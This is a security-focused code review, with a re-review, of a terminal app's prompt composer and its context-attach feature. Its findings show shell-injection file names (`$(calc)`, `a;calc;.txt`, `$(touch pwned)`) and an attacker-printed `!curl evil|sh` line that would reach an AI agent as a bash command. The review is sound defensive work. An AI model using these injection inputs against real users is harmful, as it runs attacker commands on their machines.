# Code review: composer and context attach

Worktree `D:\kelpie-p9` (branch `phase9/composer`, base b64543f), uncommitted. Reviewed against
`phase-09-composer-context.md`, plan.md (Definition of done, UX rules, RT-10) and the developer report.
No source file was modified.

## Scope
- Files: composer.tsx/.css, composer-state.ts, mentions.ts (+test), prompt-history.ts (+test), send-to-agent.ts,
  pane-view, terminal-pane, file-viewer, diff-view, palette, commands.ts, ipc.ts, store/types, chat-model and the
  claude/codex/acp adapters, fs_ops.rs, search.rs and search/rank.rs (+tests), lib.rs, docs, README, e2e composer.py,
  fake_tui_agent.py, fake_acp_agent.py, context_cost.py. About 530 changed lines plus about 1,400 new lines.
- I also traced the code these depend on: `typeInto` (quick-commands.ts), `TerminalHost.paste` / `typedText`,
  `git_context` (git_sync.rs), `guard` (fs_ops.rs), the app-level drop handler (app.tsx), the keymap (commands.ts),
  Tauri/wry devtools defaults and Gemini CLI's `@` parser.

## Checks run
| Check | Result |
|---|---|
| `pnpm test` | 17 files, 199 tests pass |
| `pnpm typecheck` | clean |
| `pnpm i18n:check` | 1530 keys, 0 missing |
| `cargo test -p kelpie --lib -- search fs_ops` (`CARGO_TARGET_DIR=D:\kelpie-p9-target`) | 9 pass, 1 ignored (bench) |
| `cargo clippy -p kelpie --all-targets -- -D warnings` | clean |
| Mention probe (node 26 running the real `mentions.ts` + `typedText`, scratch copy) | reproduces C1, M2, M5 below |
| Fuzzy bench (the real `rank.rs` in a scratch release crate, workspace profile thin LTO, cu=1, O3, in-memory 51,025-entry tree with the same layout as the ignored test) | see Perf |
| GUI e2e `composer.py` | not re-run (needs the GUI on the user's desktop; the machine was at 99-100 % CPU for most of the review) |

## Perf (fuzzy, 50k files + 1,025 folders, 200 samples/run, 4-core machine)
| Load during run | new, all cores p50 / p95 | new, 1 thread p95 | old ranking p95 | 4 queries in flight (wall) p95 |
|---|---|---|---|---|
| 99-100 % (chrome, link.exe, go, Defender) | 25-51 / **202-498 ms** | 76-152 ms | 104-232 ms | 141-2154 ms |
| 14-65 % (Defender only) | 4.6-5.3 / **11.9-15.6 ms** | 32-33 ms | 33-35 ms | 49-54 ms |

The ≤ 30 ms p95 gate holds when the machine is quiet. Under contention the fan-out has a **worse** tail than one thread,
because `thread::scope` waits for the slowest worker on a starved core (see L3). Cutting the bonus to the top 400 did not
change the top 10 for any of the 10 bench queries.

---

## Critical

### C1. Path mentions reach a shell unescaped and are auto-submitted: a repository file name runs a command
`app/src/lib/mentions.ts:32-41` (`quoted` only adds `"…"` when there is whitespace), `app/src/components/composer.tsx:177`
(the completion inserts `pathMention(h.path)`), `composer.tsx:315-333` (`submit = isAgentKind(kind) || !out.inlined`).

In paths-only mode (a shell without bracketed paste, which includes the real pwsh 7.6 here) and for folder mentions in
any shell, nothing is inlined, so `out.inlined` is false and the text is **submitted**. The path is not shell-escaped.
Probe output (the real `expandMentions` + `typedText`):
```
type @$(calc).txt              -> "type $(calc).txt"            submitted   (pwsh/bash: runs calc)
type @a;calc;.txt              -> "type a;calc;.txt"            submitted   (pwsh: runs calc)
type @"notes $(calc) x.md"     -> "type \"notes $(calc) x.md\"" submitted   (double quotes still expand $() in pwsh/bash)
cd @$(id)/  (bash, bracketed)  -> "cd $(id)/"                   submitted
```
I checked in pwsh that `echo "notes $(Write-Output INJECTED) x.md"` prints `INJECTED`. `$ ( ) ; & ' `` ` `` are all
legal in Windows file names. A cloned repository only has to contain such a name. The user picks it from the `@` completion
(which shows a normal-looking file), presses Enter, and the command runs. The same auto-submit also makes a lone
`@scripts/deploy.ps1`, or a dropped `setup.exe` (`composer.tsx:239-242`, which becomes an absolute-path mention), **execute
the file**. The developer saw exactly this in a first e2e run (`@inject.txt` opened in its default app) and changed the
test rather than the behaviour. The e2e fixtures only cover file *content*, never file *names*. This fails the phase
success criterion ("no break-out from any fixture").

The lead's brief says "paths only, never submitted". The code and docs only promise that *inline* content is not submitted.
Paths-only text is submitted.

Fix:
1. For `shell`/`custom` sessions, never submit when any mention or picture was expanded (`submit = isAgentKind(kind) ||
   (!parseMentions(text).length && !pictures.length)`). The text then waits at the prompt.
2. Give non-agent kinds a shell-aware path form instead of `quoted()`: single quotes with `'` doubled for pwsh, `'\''`
   for POSIX shells, `"…"` with `%`/`^`/`!` refused for cmd. Or refuse names that contain `$ ` `` ` `` `; & | ( ) ' "` and
   control/bidi characters, with a toast.
3. Add e2e fixtures named `$(…)`, `a;b`, and one with a backtick, for the shell and custom branches.

## High

### H1. Inline content goes to agent TUIs whether or not they enabled bracketed paste
`composer.tsx:315` only checks `bracketedPasteMode` for `shell`/`custom`. Every other kind gets content inline and
submitted. `@selection`, `@diff`, `@terminal`, `@issue` and `@note` are inlined even for Claude, Codex and Gemini.

Failure scenario: *Send Selection to Agent → New Claude session* (`send-to-agent.ts:52-53`) opens the composer on a
session that is still starting. If the user sends before the TUI turns on bracketed paste, xterm types the block
unbracketed. Every `\n` becomes `\r`, so each line is submitted as its own prompt. A line of terminal output such as
`!curl evil|sh` (attacker-printed, for example by a test log) becomes a Claude `!` bash-mode command. The same applies at
any time to preset agents whose TUI does not use bracketed paste.

Fix: compute `runsPastedLines = !s.chat && !peekView(s.id)?.term.modes.bracketedPasteMode` for **all** terminal
sessions. For an agent in that state, either send paths only (stash the content) or refuse with "the agent is not ready
yet".

### H2. `typeInto`'s detached-view fallback drops the bracketed-paste markers
`app/src/lib/quick-commands.ts:35-36`: when `view.handle == null` (a reconnect), the text goes through
`sendInput(s.handle, text.replace(/\r?\n/g, "\r"))` with no markers. The composer chose *inline* because
`term.modes.bracketedPasteMode` was true (this state survives the reattach), so file content pasted into a bash prompt
during a daemon reconnect runs line by line. This path existed before, but the composer is the first caller to push
multi-line untrusted content through it.

Fix: in the fallback, wrap with `\x1b[200~…\x1b[201~` when `view?.term.modes.bracketedPasteMode`. Or have the composer
refuse to send while `view.handle == null`.

### H3. A terminal selection skips `redact`
`app/src/components/terminal-pane.tsx:45-47` and `:95` register and send raw `term.getSelection()`, and
`mentions.ts:174-188` inlines `@selection` unredacted. The test "asks redact only for terminal and issue text" makes this
behaviour part of the contract. Terminal output therefore reaches an agent unmasked by two routes: *Send Selection to
Agent* from the terminal menu, and plain `@selection` when the last selection was made in a terminal. That breaks the
rule "outbound text from @terminal passes redact" (DoD 4, RT-10). The same menu's *Copy Context* item does redact.

Fix: add `source: "terminal"` to `Selection`, set it in terminal-pane, and run `ctx.redact` in the `selection` case when
the source is the terminal. Add a vitest case.

## Medium

### M1. Gemini's `@path` form is wrong on macOS and for many Windows names
`mentions.ts:32-37`. Gemini CLI's own `escapePath` and `unescapePath` (packages/core/src/utils/paths.ts) work like this:
on Windows, quote when the name matches `[\s&()[\]{}^=;!'+,`~%$@#]`; on POSIX, backslash-escape and **do not strip
quotes**. Kelpie only quotes on whitespace, so `@foo(1).ts` becomes `@foo` on Windows (its regex stops at `(`), and
`@"my file.md"` looks up a file literally named `"my file.md"` on macOS. Claude CLI accepts `@"…"`. Codex does not expand
`@` (the model just reads the text), so quoting is harmless there.

Fix: give `pathMention` a per-agent and per-OS form. For Gemini, use the same rules as Gemini's `escapePath`.

### M2. `@diff` never reports "no changes" and sometimes leaves out unstaged work
`composer.tsx:110` calls `git_context(kind:"staged")` (`app/src-tauri/src/git_sync.rs:195-206`).
(a) On a clean tree it returns `"\nNew files:\n\n"`, which is non-empty after `trim()`. The probe shows the agent gets
a fenced `New files:` block instead of the "nothing to diff" warning. The vitest uses `diff: ""`, which the real command
never returns.
(b) When anything is staged it returns **only** the staged patch, but the label says "Uncommitted changes (git diff)".

Fix: add a `kind: "worktree"` (`git diff HEAD` plus untracked files) and return `""` when everything is empty. Or
special-case the result in `mentionContext`.

### M3. Temp-file references are meaningless for remote sessions
`composer.tsx:128` (`stash` writes the local `%TEMP%\kelpie-composer`). Pictures are refused for remote sessions, but
stashed text is not. `@terminal` reads 400 lines (`agent-actions.ts:44`), which is more than the 200-line cap, so it is
stashed almost every time. A remote agent then receives a Windows temp path it cannot open. Large `@diff` and
`@selection` have the same problem.

Fix: when `s.remote`, inline the last ≤ 200 lines / ≤ 64 KB, or refuse with a message. Separately, ask `session.read`
for 200 lines so `@terminal` inlines in the common case instead of turning into a file.

### M4. Inlining fenced content into a shell is unsafe to "read and run"
In the bracketed-shell branch, the block is left at the prompt. Its labels are Markdown, for example ``File `inject.txt`:``
and ```` ```txt ````. If the user presses Enter, bash/zsh run the file content line by line, **and the label runs
`inject.txt` through command substitution**. There is no shell-safe way to "run" a Markdown fence.

Decision judgment: for `shell`/`custom`, always use paths only (shell-quoted, as in C1) and never inline. That is simpler
(one rule, and the bracketed/non-bracketed split goes away) and matches the spec's intent ("inserted inert").

### M5. Chat image size limits and memory
`composer.tsx:32,226`, `fs_ops.rs:408-418`. Up to 8 pictures of 25 MiB each are held as base64 in the signal, then in the
chat queue, then in one stdin JSON line. The Anthropic API rejects images over 5 MB, so a Claude chat turn fails after a
33 MB IPC round-trip. Fix: cap chat pictures at about 5 MB (or downscale them in a canvas before encoding). Keep 25 MiB
only for the TUI path reference.

### M6. Sending continues after the composer is closed
`composer.tsx:306-343`. `send()` awaits `expandMentions`, which can take seconds (Linear/Jira/GitLab lookups for
`@issue`, `git diff`). If the user presses Esc meanwhile, the component unmounts, `onCleanup` saves the draft
(`sent` is still false), and the prompt is **still sent**. The user ends up with a "cancelled" prompt that was delivered
and a stale draft. Fix: set a `disposed` flag in `onCleanup` and bail out before `sendToSession` and `getController().send`.

## Low

- **L1** `fs_read_image` (`fs_ops.rs:408-418`): symlinks and junctions named `*.png` are followed. A UNC path triggers SMB
  authentication. Size is checked with `metadata` and then `read` reads the whole file (TOCTOU). This is **not a new trust
  boundary**: `guard(root, …)` takes a caller-chosen `root`, so webview JS can already read any file. Still, read through
  `File::open(..).take(MAX+1)` and reject `\\` paths for drops.
- **L2** Temp files (`%TEMP%\kelpie-composer`, `fs_ops.rs:363-389`) hold unredacted diffs and selections. They are cleaned
  only when another temp file is written, and the README says everything stays in `%LOCALAPPDATA%\Kelpie`. Clean on startup
  too, and document the temp folder in the privacy line.
- **L3** `rank.rs:54-80` spawns up to 8 OS threads per query, and the palette (`palette.tsx:163`) and explorer query on
  every keystroke with no cancellation. Under load, the p95 is worse than one thread (Perf table). Consider a shared
  rayon pool or `min(cores-1, 4)` workers, and drop superseded queries (a generation counter checked between chunks).
- **L4** The spec claims "the daemon sanitiser (`paste:true`) applies", but the daemon's `typed_text` only covers startup
  prompts (`crates/kelpied/src/session.rs:683`). Composer input is sanitised only by the front end's `typedText`. That is
  correct, since it is the single choke point for both `TerminalHost.paste` and the `typeInto` fallback, but
  `docs/architecture.md` should say so.
- **L5** Bidi and other invisible characters (U+202A-202E, U+2066-2069) in file names are not stripped by `typedText`, so
  the completion can show `bidi‮txt.exe` reversed. Flag or strip them in `pathMention` for display.
- **L6** `@terminal:<prefix>` resolves to the *first* label that starts with the prefix (`composer.tsx:114-116`). An
  ambiguous prefix can inline the wrong session's output. Require an exact match, or warn when several match.
- **L7** `formatNotes` (`mentions.ts:128`) duplicates `notesPrompt` (`diff-view.tsx:69`) with a different format. Keep one.
- **L8** `chat-model.ts:49`: the doc comment "A message sent while the agent was busy…" now sits above `ChatImage`
  instead of `QueuedMessage`.
- **L9** A picture dropped while the session was a TUI has no `data`. If the session is then switched to chat,
  `data: i.data!` (`composer.tsx:326`) sends an image block with `undefined` data. Read the bytes lazily at send time.
- **L10** The prompt history (`AppState.promptHistory`) persists raw prompts, which can include pasted secrets, and is
  never pruned when a project is removed.
- **L11** Ctrl+Shift+I: the conflict checker only compares Kelpie's own commands, and that check passes. But `tauri` is
  built with the `devtools` feature, so release webviews have DevTools on (`tauri-runtime-wry` `devtools.unwrap_or(true)`)
  and browser accelerators enabled. The keymap only calls `preventDefault` when `when()` is true (a live focused session),
  so with no live session Ctrl+Shift+I falls through to WebView2's DevTools shortcut. The e2e uses WebDriver synthetic
  keys, which bypass browser accelerators, so this was not exercised. Verify manually in the release app.

## Decisions
| Decision | Judgment |
|---|---|
| `@issue` from Linear/Jira/GitLab, no GitHub issues | Accept. It reuses the existing Issues panel integrations. `github.rs` only knows PRs (verified). |
| Unresolved mention warns once, a second Enter sends as written | Accept. Minor: the stash files are already written on the aborted attempt, and the paths-only toast shows at the same time. |
| Shell paths-only mode | Partly reject. Paths-only is right, but it must also mean **not submitted** and **shell-quoted** (C1). Inline content into shells should go entirely (M4). |
| Filename bonus only on the top 400 | Accept. It is deterministic across thread counts (tested), and the top 10 were unchanged in the bench. |
| `.env` and other files inlined unredacted via `@file` for non-`@path` agents | Within spec, which only names `@terminal` and `@issue`. Claude, Codex and Gemini get the path anyway. Record it as intended in the user guide. |

## Checked and fine
- `typedText` strips C0 (except tab and LF), DEL and C1 including U+009B, so `\x1b[201~` arrives as an inert `[201~`
  (the probe confirms it). Every TUI path (`TerminalHost.paste`, the `typeInto` fallback) applies it.
- The Codex 250 ms Enter delay is kept (`sendToSession → typeInto(…, 250)`).
- `redact` is applied to `@terminal` and `@issue` before inlining and before stashing, on both the TUI and the chat path
  (the chat path uses the same `out.text`). It fails closed: a rejected `redact_batch` aborts the send.
- Absolute paths are never read by Kelpie (they are passed through as references). Relative paths go through the lexical
  `guard`.
- The composer is not mounted while closed (keyed `<Show>`, separate lazy chunk). The always-on cost is one
  `onSelectionChange` per terminal and one editor update listener.
- The composer drop does not double-paste into the terminal: the app's handler looks up `[data-session]`, which only
  `.term-wrap` has, and the composer sits outside it.
- The watcher invalidates the index on create, remove and rename (directories included). `with_parent_dirs` is correct.
- No plan IDs in code. Clippy, typecheck and i18n are clean. `composer.py` sets `KELPIE_ENDPOINT` and `KELPIE_DATA_DIR`
  in its own environment before starting anything.

## Recommended actions (in order)
1. C1: no auto-submit after expanded mentions for shell/custom, plus a shell-aware path form, plus e2e name fixtures.
2. H1: check bracketed paste for every terminal session before inlining. H2: keep the markers in the `typeInto`
   fallback, or refuse while detached.
3. H3: redact terminal selections.
4. M1-M6.
5. Re-run `composer.py` and the bench on a quiet machine before closing the gate.

## Unresolved questions
- Does Gemini's ACP mode, or Claude's stream-json chat mode, expand `@path` in prompt text? If not, atPath agents in chat
  views get a bare path and must read it with a tool (possibly behind a permission prompt). ACP `resource_link` blocks
  would be the native form.
- Is it intended that the Ctrl+Shift+I falls through to DevTools in release builds when no session is live (L11)?

Status (first pass): DONE_WITH_CONCERNS. One Critical and three High findings, superseded by the re-review below.

---

## Re-review (2026-10-25)

I checked the current `D:\kelpie-p9` tree against the "Review fixes" table in the developer report. No source files were
modified.

**Method:** the real `mentions.ts` + `typed-text.ts`, copied to the scratchpad and run under node 26. In the scratch copy
only, one TypeScript parameter property was rewritten to a plain field so node's type stripping accepts it; the logic is
unchanged. Every fixture name was run through `expandMentions` for pwsh, posix and cmd, plus the agent forms, the remote
path, `pasteInput` and the composer's submit rule. I also read `composer.tsx`, `quick-commands.ts`, `git_sync.rs`,
`fs_ops.rs`, `rank.rs` and `commands.ts`.

| Check | Result |
|---|---|
| `pnpm test` | 17 files, 212 pass |
| `pnpm typecheck` | clean |
| `pnpm i18n:check` | 1534 keys, 0 missing |
| `cargo test -p kelpie --lib -- search fs_ops git_sync` | 9 pass, 1 ignored |
| `cargo clippy -p kelpie --all-targets -D warnings` | clean |
| GUI e2e | not re-run (developer reports 85/85 twice) |

### Fix verification
| Finding | Verdict | Evidence |
|---|---|---|
| C1 quoting | **Fixed** | pwsh: `'$(calc).txt'`, `'a;calc;.txt'`, ``'x`whoami`.txt'``, `'it''s.txt'`, `'it’’s.txt'` (smart quotes doubled, which pwsh needs), `'a&calc&.txt'`. posix: `'it'\''s.txt'`, `'~/x'`, `'-rf'`. cmd: plain names bare, `"…"` otherwise; `$( ) & % (` refused. ESC and bidi names are refused for every shell. `deploy.ps1` and `C:\…\setup.exe` stay bare in pwsh, which is safe only because of the no-submit rule. |
| C1 no submit | **Fixed for parsed mentions**, one gap (R1) | `composer.tsx:379`: `submit = isAgentKind \|\| (!parseMentions(text).length && !pictures.length)`. |
| C1 / M4 no fenced content into shells | **Fixed** | `mentions.ts:200,211`: a shell kind forces `budget = -1`, and `@diff`, `@selection` and `@terminal` become quoted temp paths. Probe: `inlined=false` for every shell case. |
| H1 | **Fixed** | `composer.tsx:344-347`: `inline: s.chat \|\| bracketed` for every terminal session. A non-bracketed agent gets temp paths (probe: OMP `@terminal` and `@selection` become paths). `:374` refuses multi-line text when the terminal has no bracketed paste. That covers the "send to a new Claude that is not ready" case. |
| H2 | **Fixed** | `quick-commands.ts:36` uses `pasteInput(raw, bracketedPasteMode)`. Probe: `"\x1b[200~a\r[201~b\x1b[201~"`: ESC stripped, markers kept. |
| H3 | **Fixed** | `terminal-pane` marks selections `source:"terminal"`. `mentions.ts:263` redacts them. Probe: `token=[redacted]`. |
| M1 | **Fixed** (local sessions) | Gemini on Windows: `@"foo(1).ts"`. Gemini on POSIX: `@my\ docs/read\ me.md`, `@foo\(1\).ts`. Claude and Codex: `@"…"` for anything the parser would cut. |
| M2 | **Fixed** | New `git_context("worktree")`: `git diff HEAD` plus untracked files, and an empty result when nothing changed. |
| M3 | **Fixed** | Remote agents get `(last 200 lines)` blocks within 64 KB. A remote shell gets `refused=remote`. `@terminal` reads 200 lines (`composer.tsx:133`). |
| M5 | **Fixed** | 5 MB per chat picture, checked at paste, at drop, and again at send, where pictures dropped on a terminal are read lazily. |
| M6 | **Fixed** | A `disposed` flag is checked after `expandMentions` and after the picture reads. There is no await between the last check and the delivery. |
| L1, L2 | Fixed | `fs_read_image`: refuses `\\` and `//` paths and symlinks (final path component only, so a directory junction in the path is still followed), reads through `take(25 MiB + 1)`. Temp folder is swept at startup. |
| L11 (Ctrl+Shift+I) | **Fixed** | `commands.ts:97`: always bound, with a toast when no session is live, so the keymap always calls `preventDefault`. The developer verified with real SendKeys key events. Residual: if the user rebinds `composer.open`, Ctrl+Shift+I opens DevTools again (acceptable). |

### New or remaining findings

**R1 (High, blocking: a residual of C1). A dropped file whose name contains a line break bypasses both the name check and
the no-submit rule.**
`composer.tsx:255-262` inserts `pathMention(rel)` for dropped non-picture files without calling `hasUnsafeName`. The name
check only exists in the completion list (`:196`) and in `shellQuote`, which only runs on mentions the parser recognises.
`quoted()` wraps a name containing `\n` as `@"…\n…"`, but `TOKEN` does not accept line breaks inside quotes. The parser
therefore finds **0 mentions**, so the shell submit rule sends Enter. Probe output:
```
"@\"x $(touch pwned)\n.txt\" "  mentions parsed: 0  -> submitted to shell: true
```
In a bracketed-paste shell (zsh on macOS has it on by default), the text is pasted with markers and then Enter is sent.
zsh then runs `$(touch pwned)` inside the double quotes. Line breaks are legal in file names on macOS (git checkouts and
zips can carry them). Windows file names cannot hold them, so a Windows-only release would not be affected, but the README
lists macOS.

Fix (two lines):
- In `drop()`, skip or refuse paths with `hasUnsafeName(p)` and show a toast.
- Base the shell no-submit decision on the raw text as well, e.g. `!/(^|\s)@/.test(text)`, so an unparseable mention still
  counts.
- Add a vitest for `parseMentions(pathMention("a\nb"))`.

**R2 (Low). Remote sessions use the local machine's OS for quoting.**
`composer.tsx:35,64-69,347`: `windows`/`shellStyle` describe the local app.
- A Gemini session on a Linux host gets Windows `@"…"`, which Gemini on POSIX does not strip, so the file is not found.
- A remote bash shell gets pwsh-style quoting. That is safe (single quotes are literal in bash and `''` just
  concatenates), but names containing `'` or `\` come out wrong.

Fix: when `s.remote`, use `posix` and `windows: false`.

**R3 (Low).** `shellQuote` single-quotes a name that starts with `-`, but quoting does not stop a command from reading it
as an option (`rm '-rf'`). Prefix relative names with `./` instead. Nothing is submitted, so this is cosmetic.

**R4 (Info).** Paths-only text in a bracketed shell is still pasted inside markers. That is harmless: the text stays at the
prompt, unsubmitted. The refusal toasts render as Solid text nodes, so names are escaped. No other new holes found.

### Perf (capped pool), measured at 12-24 % load (Defender and chrome only)
51,025 entries, real `rank.rs`, release build with the workspace profile, 3 runs × 200 samples.

| Workers | p50 | p95 |
|---|---|---|
| shipped: 2 (half of 4 cores) | 5.8-7.8 ms | **16.8-21.4 ms** |
| 1 | 9.9-11.2 ms | 30.4-32.2 ms |
| 4 | 4.3-4.6 ms | 10.6-10.8 ms |

The ≤ 30 ms gate holds with the capped pool when the machine is quiet. The trade-off is that half the cores roughly doubles
the p95 compared with 4 workers. The shared-counter chunking keeps the results deterministic: each worker keeps its own top
`keep` before the merge.

### Still blocking
- **R1** only. Everything else from the first pass is fixed or accepted (L7 was left on purpose with a stated reason; I
  agree).

Status: DONE_WITH_CONCERNS
Summary: C1, H1-H3, M1-M6 and L11 are verified fixed: shell quoting is correct for pwsh, bash and cmd, nothing is submitted after a parsed mention, and no fenced content reaches shells. The fuzzy p95 is 16.8-21.4 ms on a quiet machine. One blocker remains (R1): a dropped file whose name contains a line break skips the name check and is submitted, which runs `$(…)` in a zsh/bash prompt on macOS; it is a two-line fix.
